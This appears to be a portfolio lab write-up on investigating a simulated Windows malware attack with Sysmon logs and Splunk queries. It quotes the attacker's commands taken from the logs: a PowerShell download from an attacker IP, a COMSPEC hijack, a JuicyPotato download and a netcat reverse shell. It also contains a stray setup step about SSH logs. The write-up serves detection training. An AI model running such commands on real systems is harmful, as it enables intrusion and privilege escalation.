# Sysmon-Log-Analysis-using-Splunk
---

Investigating a Malware Attack Using Sysmon Logs and Splunk SIEM
Project Overview
In this project, I analyzed Sysmon logs using Splunk SIEM to investigate a simulated malware attack on a Windows endpoint.
The goal was to reconstruct the attack chain, identify the attacker's techniques, detect Living-Off-The-Land Binary (LOLBin) abuse, track malware downloads, and map findings to the MITRE ATT&CK framework.
This project demonstrates how to use Splunk for sysmon log monitoring and security analysis
The analysis focuses on identifying attacker activity, process execution, malware downloads, LOLBin abuse, network communication

---

Objectives
Investigate attacker activity through Sysmon logs
Identify the initial access vector
Detect malware execution
Track malicious downloads
Identify LOLBin abuse
Investigate privilege escalation attempts
Build an attack timeline
Map findings to MITRE ATT&CK

Skills Demonstrated
Sysmon Log Analysis
Threat Hunting
Splunk Search Processing Language (SPL)
Incident Investigation
Attack Timeline Reconstruction
MITRE ATT&CK Mapping

Lab Setup
Before starting this project:
Install Splunk Enterprise or Splunk Free Edition
Download the Sysmon JSON Logs dataset (Sysmon JSON Logs)
Splunk Configuration
tep 1: Upload SSH Logs into Splunk
Open Splunk Web Interface
Navigate to:
Apps → Search & Reporting
Click:
Add Data → Upload
Upload the file:
ssh_log.json
Configure:
Sourcetype: _json
Index Name: ssh_logs
Review extracted fields and click:
Start Searching

Index: sysmon_logs
Sourcetype: sysmon_json
---

Step 1: Log Ingestion and Validation
After uploading the Sysmon dataset into Splunk, I first verified that events were properly parsed.
SPL Query
index=sysmon_logs
| stats count by Event.System.EventID
Purpose
Validate Sysmon Event IDs present in the dataset.
Screenshot

Step 2: Hunting for Suspicious PowerShell Activity
PowerShell is commonly abused by attackers for downloading payloads and executing malicious code.
SPL Query
index=sysmon_logs
| spath
| search "powershell"
Findings
The search revealed the following command:
Invoke-WebRequest -Uri http://192.168.1.11:6969/supply.exe
Step 3: Determining Initial Access
After identifying the malicious IP address, I searched for its earliest occurrence.
SPL Query
index=sysmon_logs
| spath
| search "192.168.1.11"
| sort _time
Purpose
Find the first interaction with attacker infrastructure.
Findings
Sysmon Event ID 15 revealed:
http://192.168.1.11:6969/updater.hta
Downloaded file:
updater.hta
Conclusion
The attacker gained initial access through a malicious HTA application.
Screenshot
📸 Insert Screenshot: updater.hta Download

---

Step 4: Reconstructing the Execution Chain
To understand how the malware executed, I built a process timeline.
SPL Query
index=sysmon_logs
| spath
| sort _time
| table _time Event.EventData.Image Event.EventData.ParentImage
Findings
The following process chain was observed:
chrome.exe
    ↓
updater.hta
    ↓
mshta.exe
    ↓
cmd.exe
    ↓
powershell.exe
Analysis
The attacker leveraged mshta.exe, a trusted Windows binary, to execute the malicious HTA file.
MITRE Technique:
T1218.005 - Mshta
Screenshot
📸 Insert Screenshot: Process Execution Chain

---

Step 5: Investigating Environment Variable Manipulation
One challenge hint referenced environment variables.
I searched for common variables that attackers frequently abuse.
SPL Query
index=sysmon_logs
| spath
| search "comspec"
Findings
set comspec=C:\Windows\temp\supply.exe
Analysis
Normally:
%COMSPEC%
points to:
C:\Windows\System32\cmd.exe
The attacker replaced it with:
C:\Windows\temp\supply.exe
This allowed execution of the malware whenever COMSPEC was invoked.
Screenshot
📸 Insert Screenshot: COMSPEC Manipulation

---

Step 6: Detecting LOLBin Abuse
After discovering COMSPEC manipulation, I searched for processes interacting with the malware.
SPL Query
index=sysmon_logs
| spath
| search "supply.exe"
Findings
The investigation revealed:
ftp.exe
executing the malicious payload.
Analysis
ftp.exe is a legitimate Windows utility.
The attacker abused it as a:
LOLBIN (Living-Off-The-Land Binary)
to blend malicious activity with legitimate system processes.
Screenshot
📸 Insert Screenshot: ftp.exe Executing supply.exe

---

Step 7: Malware Behavior Analysis
After identifying supply.exe, I examined the commands executed by the malware.
SPL Query
index=sysmon_logs
| spath
| search "supply.exe"
| table _time Event.EventData.CommandLine
Findings
First observed command:
ipconfig
Analysis
The malware performed reconnaissance to gather:
IP Addresses
Network Interfaces
Host Configuration

MITRE Technique:
T1082 - System Information Discovery
Screenshot
📸 Insert Screenshot: Reconnaissance Commands

---

Step 8: Identifying Malware Language
Sysmon Event ID 7 records DLL loading activity.
SPL Query
index=sysmon_logs Event.System.EventID=7
| spath
| search "python"
Findings
python27.dll
was loaded by:
supply.exe
Analysis
This strongly suggests the malware was written in Python and packaged into an executable.
Screenshot
📸 Insert Screenshot: python27.dll Load Event

---

Step 9: Detecting Secondary Payload Downloads
Since PowerShell was already being abused, I searched for additional download activity.
SPL Query
index=sysmon_logs
| spath
| search "Invoke-WebRequest"
Findings
Downloaded file:
JuicyPotato.exe
Source:
https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
Analysis
Juicy Potato is a well-known privilege escalation utility used to obtain SYSTEM privileges.
MITRE Technique:
T1068 - Exploitation for Privilege Escalation
Screenshot
📸 Insert Screenshot: JuicyPotato Download

---

Step 10: Investigating Reverse Shell Activity
Next, I searched for Juicy Potato execution.
SPL Query
index=sysmon_logs
| spath
| search "juicy.exe"
Findings
juicy.exe -l 9999 -p nc.exe -a "192.168.1.11 9898 -e cmd.exe"
Analysis
This command:
Launches Netcat

Connects back to attacker machine

Spawns a command shell

Reverse Shell Indicators
ItemValueAttacker IP192.168.1.11Port9898ToolNetcatShellcmd.exe
Screenshot
📸 Insert Screenshot: Reverse Shell Command

---

Attack Timeline
TimeActivity1updater.hta downloaded2mshta.exe executes HTA3PowerShell launched4supply.exe downloaded5COMSPEC modified6ftp.exe abused7supply.exe executed8ipconfig reconnaissance9python27.dll loaded10JuicyPotato downloaded11Privilege escalation attempted12Reverse shell established

---

MITRE ATT&CK Mapping
TechniqueATT&CK IDUser ExecutionT1204PowerShellT1059.001Command ShellT1059.003MshtaT1218.005Ingress Tool TransferT1105Privilege EscalationT1068Reverse ShellT1071System DiscoveryT1082

---

Key Indicators of Compromise (IOCs)
IOC TypeValueIP Address192.168.1.11Port6969Port9898Fileupdater.htaFilesupply.exeFileJuicyPotato.exeLOLBinftp.exeLOLBinmshta.exe

---

Conclusion
This investigation demonstrated how Sysmon telemetry combined with Splunk can reveal the complete lifecycle of a cyber attack. Starting from a malicious HTA file, the attacker leveraged trusted Windows binaries, downloaded malware using PowerShell, manipulated environment variables, abused LOLBins, escalated privileges with Juicy Potato, and ultimately established a reverse shell.
Through systematic threat hunting and timeline reconstruction, it was possible to identify every stage of the attack and map the activity to the MITRE ATT&CK framework, providing valuable insight into attacker tradecraft and detection opportunities.
Recommended Screenshots (10–12 total)
Sysmon Event ID validation
PowerShell search results
Invoke-WebRequest command
HTA download evidence
Process tree (chrome → mshta → powershell)
COMSPEC modification
ftp.exe LOLBin abuse
supply.exe execution
python27.dll load event
JuicyPotato download
Reverse shell command
Final attack timeline table

This structure is ideal for Medium, LinkedIn Articles, GitHub portfolio projects, and SOC Analyst interview discussions. 
